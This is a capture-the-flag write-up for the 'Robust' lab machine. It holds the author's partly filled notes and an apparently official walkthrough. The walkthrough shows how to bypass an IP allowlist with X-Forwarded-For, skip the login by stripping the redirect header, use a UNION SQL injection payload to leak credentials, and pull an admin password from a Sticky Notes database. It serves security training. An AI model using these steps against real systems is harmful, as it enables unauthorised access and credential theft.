---
title: Robust
parent: Proving Grounds Play
grand_parent: Writeups
nav_order:
---
---
# Reconnaissance

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Practice/Robust]
└─$ sudo nmap -Pn -p- -sS -oN open-port_scan.txt --open 192.168.104.200
[sudo] password for kali: 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-18 01:29 +0900
Nmap scan report for 192.168.104.200
Host is up (0.085s latency).
Not shown: 65532 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
7680/tcp open  pando-pub

Nmap done: 1 IP address (1 host up) scanned in 136.11 seconds
```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Practice/Robust]
└─$ sudo nmap -Pn -p22,80,7680 -sSCV -A -oN full_tcp-scan.txt --open 192.168.104.200
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-18 01:32 +0900
Nmap scan report for 192.168.104.200
Host is up (0.083s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH for_Windows_8.1 (protocol 2.0)
| ssh-hostkey: 
|   3072 21:76:63:1c:3b:10:a6:a7:73:d6:e7:dd:1e:a2:b6:83 (RSA)
|   256 62:a8:39:f6:ab:92:cd:26:03:bf:1e:28:25:4e:8e:7a (ECDSA)
|_  256 02:39:7c:e2:af:6a:44:98:ec:9a:28:98:a0:8b:fe:c4 (ED25519)
80/tcp   open  http       PHP cli server 5.5 or later (PHP 7.3.33)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_Requested resource was login.php
7680/tcp open  pando-pub?
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 10|2019 (92%)
OS CPE: cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_server_2019
Aggressive OS guesses: Microsoft Windows 10 1903 - 22H2 (92%), Microsoft Windows 10 1909 - 2004 (85%), Microsoft Windows Server 2019 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   82.78 ms 192.168.45.1
2   82.75 ms 192.168.45.254
3   83.40 ms 192.168.251.1
4   83.46 ms 192.168.104.200

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.27 seconds
```

http://192.168.104.200/login.php

![](../../../assets/images/Pasted%20image%2020260618013953.png)

```zsh
wfuzz -H "X-Forwarded-For: 10.10.10.10"  --sc 302 -u http://192.168.104.200/FUZZ.php -w /usr/share/seclists/Discovery/Web-Content/big.txt
```
![](../../../assets/images/Pasted%20image%2020260618025549.png)

![[Pasted image 20260630224201.png]]

```zsh

```

---

# Initial Access

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```
---

# Privilege Escalation

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```


<details markdown="1">
<summary>Walkthrough</summary>

```zsh
Walkthrough for Robust
Summary
In this walkthrough, we try to bypass a 403 Forbidden restriction and login page using the X-Forwarded-For and Location headers. We then perform a UNION-based SQL Injection in an input field to get user credentials. We try to login via SSH using those credentials and get an admin password from one of the Sticky Notes after enumerating different directories in the target system. Finally, we log in as Administrator via SSH using the found credentials.

Enumeration:
To start, we enumerate the target using an Nmap scan using the "All ports" flag to find the services running on all open ports.

┌──(root💀kali)-[/media/psf/Desktop/Robust Box]
└─$ nmap -T4 -p- -sV  192.168.1.55
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-22 15:39 IST
Nmap scan report for 192.168.120.117
Host is up (0.21s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH for_Windows_8.1 (protocol 2.0)
80/tcp open  http    PHP cli server 5.5 or later (PHP 7.3.33)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 402.70 seconds

We find ports 22 and 80 are open. We can see that an HTTP service is running on port 80. Let's try to visit that port using a web browser.

After visiting the page, we see the following message on the screen.

Your IP is not allowed to use this webservice. Only 10.10.10.x is allowed
```
![](../../../assets/images/Pasted%20image%2020260618015659.png)
```
IP Not Allowed
IP Not Allowed
The web server is restricting us from accessing the web page/web application. There might be an access control mechanism to only allow a specific range of IPs (10.10.10.x in this case) to access the resources. We need to bypass this mechanism in order to gain access to the web page.

Bypassing Forbidden
To bypass the access control mechanism, we can use an HTTP request header called X-Forwarded-For. Here, we need to add X-Forwarded-For: 10.10.10.10 header to bypass the restriction and will be subsequently redirected to a Robust Employee Manager login page.
```
![](../../../assets/images/Pasted%20image%2020260618020624.png)
```

IP Restriction Bypassed
IP Restriction Bypassed
To bypass this restriction permanently, we need to add this header in the Match and Replace rule in "Options" tab under "Proxy" option in the "Burp Suite" which will add this header to every request.
```


![](../../../assets/images/Pasted%20image%2020260618020615.png)
```

X-Forwarded-For Header
X-Forwarded-For Header
After bruteforcing the login page using some default user credentials, we were unable to gain access.

Let's try to fuzz the target to identify interesting files using wfuzz tool.

┌──(root💀kali)-[/media/psf/Desktop/Robust Box]
└─# wfuzz  -H "X-Forwarded-For: 10.10.10.10"  --sc 302 -u http://192.168.1.55/FUZZ.php -w /init/custom_wordlists/big.txt

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000001:   302        58 L     142 W      3030 Ch     "home"

Out of all the files identified by the tool, /home.php seems to be the most interesting. While reviewing the response of /home.php in "Burp Suite", it shows that the contents of page are revealed before redirecting to the login page. This happens when the code is not properly terminated using the exit(); function.

Bypassing Login Page
Let's try to bypass the login page by removing the Location: login.php header in the response using "Burp Suite". We can do this in the Match And Replace rule in "Options" tab under "Proxy" option in the "Burp Suite" to remove the header from all responses.
```
![](../../../assets/images/Pasted%20image%2020260618022420.png)
```

We can see that the application redirected to a dashboard page ("Manage Employees" page) after removing the Location header.
```
![](../../../assets/images/Pasted%20image%2020260618022446.png)
```
Since the dashboard is used for managing employees, let's try a UNION-based SQL Injection in the employees table. Type the SQL query ' Union select * from employees; in either First Name or Last Name fields to reveal an extra line. Here, we can observe a sequence of characters in the Birth date field for the employee Jeff.

First name	Last name	Birth date
	Jeff	 Hills	    Mathsisfun123

```
![](../../../assets/images/Pasted%20image%2020260618022506.png)
```
Jeff's Password
Looks like the keyword Mathsisfun123 might be the password of the user Jeff. Let's try to connect as Jeff via SSH using the this keyword.

ssh jeff@192.168.1.55 
jeff@192.168.1.55's password:



Microsoft Windows [Version 10.0.19044.1645]
(c) Microsoft Corporation. All rights reserved.
                                               
jeff@ROBUST C:\Users\Jeff>

We successfully logged in as Jeff. Let's check the contents of the Jeff folder using the dir command.

jeff@ROBUST C:\Users\Jeff>dir                  
 Volume in drive C has no label.                  
 Volume Serial Number is 08DF-534D                
                                                  
 Directory of C:\Users\Jeff                       
                                                  
03/21/2022  10:22 PM    <DIR>          .          
03/21/2022  10:22 PM    <DIR>          ..         
03/21/2022  10:20 PM    <DIR>          3D Objects 
03/21/2022  10:20 PM    <DIR>          Contacts   
03/21/2022  10:20 PM    <DIR>          Desktop    
03/21/2022  10:20 PM    <DIR>          Documents  
03/21/2022  10:20 PM    <DIR>          Downloads  
03/21/2022  10:20 PM    <DIR>          Favorites  
03/21/2022  10:20 PM    <DIR>          Links      
03/21/2022  10:20 PM    <DIR>          Music      
03/21/2022  10:22 PM    <DIR>          OneDrive   
03/21/2022  10:21 PM    <DIR>          Pictures   
03/21/2022  10:20 PM    <DIR>          Saved Games
03/21/2022  10:21 PM    <DIR>          Searches   
04/22/2022  01:36 AM    <DIR>          Videos     
               0 File(s)              0 bytes     
              15 Dir(s)   3,982,659,584 bytes free
We are able to move between different directories within the target system.

Privilege Escalation
While checking all the directories of the target system, we have identified that the Sticky Notes application is installed in the %LocalAppData%\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState folder.

jeff@ROBUST C:\Users\Jeff>cd C:\Users\Jeff\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState

jeff@ROBUST C:\Users\Jeff\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState>dir

27-01-2022  11:07    <DIR>          .
27-01-2022  11:07    <DIR>          ..
26-01-2022  06:21            20,480 15cbbc93e90a4d56bf8d9a29305b8981.storage.session
26-01-2022  13:02            61,440 plum.sqlite
27-01-2022  11:07            32,768 plum.sqlite-shm
27-01-2022  11:11           288,432 plum.sqlite-wal
               4 File(s)        403,120 bytes
               2 Dir(s)   7,735,762,944 bytes free

In this location, we can find a database file called plum.sqlite which saves all the content of Sticky Notes. Let's try to find the contents of the plum.sqlite DB file using the type command.

Jeff@ROBUST C:\Users\Jeff\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState>type plum.sqlite

↨↨↨☺à♥tableMediaMedia♫CREATE TABLE "Media" (
"LocalFileRelativePath" varchar ,
"RemoteId" varchar ,
"MimeType" varchar ,
*************************************************************************************
\id=a6c52b67-f266-45ff-9aaf-5ccbe22f7d45 Admi☺¶éUU♠♠\id=0d4b8d2c-8539-4fb4-8c8b-184552bf9b92 Credentials:
\id=a6c52b67-f266-45ff-9aaf-5ccbe22f7d45 Administrator:MySupersecurePassword2112ManagedPosition=Yellow983b5947-15eb-4375-97f6-2d646a91dba42fa3c77f-fd
u7-442c-a2e8-11cd97ffdbb┘Óö"£e┘Óö=,
From the output obtained from the command above, we can find an interesting keyword called "Administrator:MySupersecurePassword2112". The characters MySupersecurePassword2112 seem to be the password of the Administrator.

Let's try to connect as Administrator via SSH using the password.

ssh Administrator@192.168.1.55
Administrator@192.168.1.55's password: 





Microsoft Windows [Version 10.0.19044.1645]
(c) Microsoft Corporation. All rights reserved.
                                               
administrator@ROBUST C:\Users\Administrator> 

Let's move directories to the "Desktop" folder and check it's contents using the dir command.

administrator@ROBUST C:\Users\Administrator>cd Desktop

administrator@ROBUST C:\Users\Administrator\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 08DF-534D

 Directory of C:\Users\Administrator\Desktop

03/21/2022  10:14 PM    <DIR>          .
03/21/2022  10:14 PM    <DIR>          ..
03/21/2022  10:14 PM                34 proof.txt
               1 File(s)             34 bytes
               2 Dir(s)   3,982,184,448 bytes free

administrator@ROBUST C:\Users\Administrator\Desktop>

We have achieved admin-level access to the target system.

```

</details>